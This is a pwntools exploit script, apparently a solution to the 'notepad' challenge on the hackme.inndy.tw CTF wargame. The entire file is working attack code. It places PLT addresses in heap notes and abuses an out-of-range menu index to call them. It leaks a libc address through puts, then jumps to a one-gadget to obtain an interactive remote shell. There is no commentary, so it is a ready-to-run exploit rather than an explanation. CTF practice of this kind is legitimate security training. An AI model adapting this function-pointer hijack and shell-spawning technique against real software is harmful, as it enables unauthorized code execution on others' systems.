from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])


t = remote('hackme.inndy.tw', 7713)
#t = remote('192.168.5.148', 10090)
#t = process('./notepad',env={"LD_PRELOAD":"./libc-2.23.so.i386"})
#elf = ELF('./notepad')
t.recvuntil('::> ')
t.sendline('c')

def add_n(size, data):
	t.sendline('a')
	t.recvuntil('size > ')
	t.sendline(str(size))
	t.recvuntil('data > ')
	t.sendline(data)



def open_n(id, data):
	t.recvuntil('::> ')
	t.sendline('b')
	t.recvuntil('id > ')
	t.sendline(str(id))
	t.recvuntil('edit (Y/n)')
	t.sendline('n')
	t.recvuntil('::> ')
	t.sendline(data)


def del_n(id):
	t.sendlineafter('::> ', 'c')
	t.sendlineafter('id > ', str(id))

raw_input()
plt_puts = 0x8048570
plt_free = 0x8048510
add_n(0x8, p32(plt_free)) #0
add_n(0x40, 'aaaa')  #1	
add_n(0x30, 'bbbb')	 #2 
open_n(1, chr(93))
del_n(0)
add_n(0x8,p32(plt_puts))
open_n(1,chr(93))
libc = ELF('./libc-2.23.so.i386')
libc.address = u32(t.recv(4)) - 48 - 0x1B2780 
magic = libc.address + 0x3ac3e
del_n(0)
add_n(0x8,p32(magic))
open_n(1,chr(93))
t.interactive()